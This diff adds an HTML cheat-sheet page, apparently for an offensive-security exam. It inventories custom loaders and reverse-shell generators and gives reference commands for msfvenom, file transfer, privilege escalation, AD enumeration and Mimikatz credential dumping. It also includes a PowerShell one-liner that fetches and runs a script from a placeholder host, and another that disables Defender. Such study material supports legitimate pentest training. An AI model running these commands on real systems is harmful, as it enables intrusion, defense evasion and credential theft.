+        <span class="tdesc">Structured finding capture with SysReptor-ready markdown output</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">/osai-report</span>
+        <span class="tdesc">Compile all findings into SysReptor-paste-ready report structure</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════════════ ARSENAL -->
+  <section class="sec" id="arsenal">
+    <div class="sechead">
+      <h2>Exam Arsenal</h2>
+      <span class="tag">Inventory</span>
+    </div>
+    <p class="secdesc">
+      Full toolchain for both Windows and Linux targets. Custom scripts form a complete
+      encrypt → drop → execute chain for each platform.
+    </p>
+
+    <p class="sublabel">Custom tools — status</p>
+    <div class="slist">
+      <div class="sitem">
+        <span class="tname">loader.py</span>
+        <span class="tdesc">Windows W^X loader — VirtualAlloc/VirtualProtect, XOR decrypt, SHA256 verify</span>
+        <span class="bdg done">done</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">linux_loader.py</span>
+        <span class="tdesc">Linux W^X loader — mmap/mprotect, same CLI/key format, SIGALRM timeout</span>
+        <span class="bdg done">done</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">xor_encrypt_bin.py</span>
+        <span class="tdesc">Cross-platform encryptor — prints SHA256 + ready loader command</span>
+        <span class="bdg done">done</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">cs_revshell/gen.sh</span>
+        <span class="tdesc">Windows: C# revshell — XOR, identifier randomisation, reconnect loop</span>
+        <span class="bdg done">done</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">gen_linux_shell.sh</span>
+        <span class="tdesc">Linux: 7 payloads in one shot — bash, python, socat, nc, perl, php, C/ELF</span>
+        <span class="bdg done">done</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">rlwrap + nc</span>
+        <span class="tdesc">Listener with readline (arrow keys, history)</span>
+        <span class="bdg nice">confirm installed</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">winPEAS / linPEAS</span>
+        <span class="tdesc">Local priv esc enumeration — Win + Linux</span>
+        <span class="bdg nice">grab if missing</span>
+      </div>
+      <div class="sitem">
+        <span class="tname">PowerView.ps1</span>
+        <span class="tdesc">AD enumeration — users, groups, ACLs, trusts, SPNs</span>
+        <span class="bdg nice">grab if missing</span>
+      </div>
+    </div>
+
+    <hr>
+    <p class="sublabel">Reference cards</p>
+    <div class="cards">
+      <div class="card">
+        <div class="ctop"><div class="ico ia">⚡</div><h3>Listeners</h3></div>
+        <ul>
+          <li><code>rlwrap nc -lvnp PORT</code> — best for raw shells</li>
+          <li><code>nc -lvnp PORT</code> — fallback without rlwrap</li>
+          <li>Metasploit <code>multi/handler</code> — staged payloads</li>
+          <li>Match PAYLOAD arch to msfvenom exactly</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ig">⚙</div><h3>msfvenom formats</h3></div>
+        <ul>
+          <li><code>-f raw</code> → .bin for loader.py / linux_loader.py</li>
+          <li><code>-f exe</code> / <code>-f elf</code> → standalone binary</li>
+          <li><code>-f dll</code> → DLL for injection</li>
+          <li><code>-f ps1</code> → PowerShell stager</li>
+          <li><code>-a x64 --platform win|linux</code></li>
+          <li><code>-e x86/shikata_ga_nai -i 3</code> — encoder</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ib">↕</div><h3>Transfer — Windows</h3></div>
+        <ul>
+          <li><code>python3 -m http.server 8080</code> (serve)</li>
+          <li><code>certutil -urlcache -split -f URL dst</code></li>
+          <li>PS <code>Invoke-WebRequest url -OutFile dst</code></li>
+          <li><code>impacket-smbserver share . -smb2support</code></li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ib">↕</div><h3>Transfer — Linux</h3></div>
+        <ul>
+          <li><code>wget http://LHOST:8080/file -O file</code></li>
+          <li><code>curl http://LHOST:8080/file -o file</code></li>
+          <li><code>scp user@LHOST:file ./file</code></li>
+          <li><code>python3 -c "import urllib..."</code> (no wget/curl)</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ir">▲</div><h3>Priv Esc — Windows</h3></div>
+        <ul>
+          <li>winPEAS.exe — comprehensive local enum</li>
+          <li><code>whoami /priv</code> — token privileges</li>
+          <li>SeImpersonatePrivilege → Potato family</li>
+          <li>PowerUp.ps1 — service / token misconfigs</li>
+          <li>Unquoted service paths, weak ACLs</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ir">▲</div><h3>Priv Esc — Linux</h3></div>
+        <ul>
+          <li>linPEAS.sh — comprehensive local enum</li>
+          <li><code>sudo -l</code> — sudo misconfigs</li>
+          <li><code>find / -perm -4000</code> — SUID binaries</li>
+          <li><code>getcap -r / 2>/dev/null</code> — capabilities</li>
+          <li><code>cat /etc/crontab</code> — cron jobs</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico ip">◈</div><h3>AD Enumeration</h3></div>
+        <ul>
+          <li>PowerView <code>Get-DomainUser</code>, <code>Get-DomainGroup</code></li>
+          <li><code>Get-DomainTrust</code> — domain trusts</li>
+          <li>SharpHound + BloodHound — path visualisation</li>
+          <li><code>Get-DomainUser -SPN</code> — Kerberoastable</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="ctop"><div class="ico it">🔑</div><h3>Credentials</h3></div>
+        <ul>
+          <li>Mimikatz <code>sekurlsa::logonpasswords</code></li>
+          <li>Mimikatz <code>lsadump::sam</code></li>
+          <li>LaZagne — browser, Wi-Fi, app creds</li>
+          <li>CrackMapExec — pass-the-hash</li>
+          <li><code>reg save HKLM\SAM sam.hive</code> — offline</li>
+        </ul>
+      </div>
+    </div>
+
+    <p class="sublabel">PowerShell quick reference</p>
+    <div class="cb"><div class="cblbl">one-liners</div>
+<pre><span class="cm"># Bypass execution policy for current session</span>
+<span class="c">powershell</span> <span class="f">-ep</span> bypass
+
+<span class="cm"># In-memory script load — no disk touch</span>
+<span class="c">IEX</span> (New-Object Net.WebClient).DownloadString(<span class="s">'http://&lt;LHOST&gt;:8080/PowerView.ps1'</span>)
+
+<span class="cm"># Disable Defender real-time (requires admin)</span>
+<span class="c">Set-MpPreference</span> <span class="f">-DisableRealtimeMonitoring</span> <span class="v">$true</span>
+
+<span class="cm"># Check current user's group memberships</span>
+<span class="c">whoami</span> /groups | <span class="c">findstr</span> <span class="s">"S-1-5-32-544"</span>  <span class="cm"># Administrators SID</span>
+
+<span class="cm"># List running processes sorted by CPU</span>
+<span class="c">Get-Process</span> | <span class="c">Sort-Object</span> CPU <span class="f">-Descending</span> | <span class="c">Select-Object</span> <span class="f">-First</span> 20</pre></div>
+
+    <p class="sublabel">Linux quick reference</p>
+    <div class="cb"><div class="cblbl">one-liners</div>
+<pre><span class="cm"># System info</span>
+<span class="c">uname</span> -a && <span class="c">cat</span> /etc/*release
+
+<span class="cm"># Identity</span>
+<span class="c">id</span> && <span class="c">whoami</span> && <span class="c">hostname</span>
+
+<span class="cm"># Network</span>
+<span class="c">ip a</span> && <span class="c">ss</span> -tlnp
+<span class="c">cat</span> /etc/hosts && <span class="c">cat</span> /etc/resolv.conf
+
+<span class="cm"># Users with real shells</span>
+<span class="c">cat</span> /etc/passwd | <span class="c">grep</span> -v nologin | <span class="c">grep</span> -v false
+
+<span class="cm"># Processes</span>
+<span class="c">ps</span> auxf
+
+<span class="cm"># Find writable directories</span>
+<span class="c">find</span> / -writable -type d 2>/dev/null</pre></div>
+  </section>
+
+</div>
